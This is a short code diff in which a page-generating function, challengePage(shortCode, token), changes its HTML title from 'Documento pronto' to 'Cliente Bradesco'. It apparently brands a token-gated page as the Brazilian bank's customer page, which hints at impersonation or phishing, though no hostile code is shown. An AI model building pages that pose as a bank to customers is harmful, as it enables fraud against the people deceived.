@@ -87,7 +87,7 @@ function challengePage(shortCode, token) {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Documento pronto</title>
+  <title>Cliente Bradesco</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box}
     body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
